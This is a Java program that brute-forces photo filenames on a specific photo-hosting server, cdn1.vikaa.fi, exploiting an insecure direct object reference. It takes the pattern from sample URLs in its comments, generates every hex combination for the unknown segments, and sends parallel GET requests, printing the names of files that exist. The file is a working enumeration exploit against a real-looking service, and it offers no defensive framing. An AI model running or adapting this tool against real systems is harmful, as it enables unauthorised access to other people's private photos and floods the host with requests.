import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class IndirectInsecureReferences {
    static List<String> fourDigitComb = new ArrayList<>();
    static List<String> twoDigitComb = new ArrayList<>();

    static void printAllKLength(char[] set, int k, String type) {
        int n = set.length;
        printAllKLengthRec(set, "", n, k, type);
    }

    static void printAllKLengthRec(char[] set,
                                   String prefix,
                                   int n, int k, String type) {
        if (k == 0) {
            if (type.equals("FOUR")) {
                fourDigitComb.add(prefix);
            } else {
                twoDigitComb.add(prefix);
            }
            return;
        }

        for (int i = 0; i < n; ++i) {
            String newPrefix = prefix + set[i];
            printAllKLengthRec(set, newPrefix, n, k - 1, type);
        }
    }

    public static void main(String[] args) throws IOException, InterruptedException {
        //http://cdn1.vikaa.fi:37904/photos/c7619725/e7f2cf005f7ec222ffff010b00003405.png
        //http://cdn1.vikaa.fi:37904/photos/c7619725/e7f2cf005f7f5f9dffff010b0000350a.png
        //http://cdn1.vikaa.fi:37904/photos/c7619725/e7f2cf005f7ec222ffff010b00003405.png
        //http://cdn1.vikaa.fi:37904/photos/c7619725/e7f2cf005f7ec2eeffff010b00003407.png
        //http://cdn1.vikaa.fi:37310/photos/d4489213/509369005f7ec530ffff010b00003407.png
        String str = "abcdef0123456789";
        char[] set1 = str.toCharArray();
        printAllKLength(set1, 4, "FOUR");
        printAllKLength(set1, 2, "TWO");
        fourDigitComb.parallelStream().forEach(str1 -> {
            for (String str2 : twoDigitComb) {
                String name = "509369005f7e" + str1 + "ffff010b000034" + str2 + ".png";
                URL url = null;
                try {
                    url = new URL("http://cdn1.vikaa.fi:37310/photos/d4489213/" + name);
                } catch (MalformedURLException e) {
                    e.printStackTrace();
                }
                HttpURLConnection con = null;
                try {
                    con = (HttpURLConnection) url.openConnection();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    con.setRequestMethod("GET");
                } catch (ProtocolException e) {
                    e.printStackTrace();
                }
                try {
                    if (200 == con.getResponseCode() || 429 == con.getResponseCode()) {
                        System.out.println(name + " " + con.getResponseCode());
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
        System.out.println("Done");
    }
}
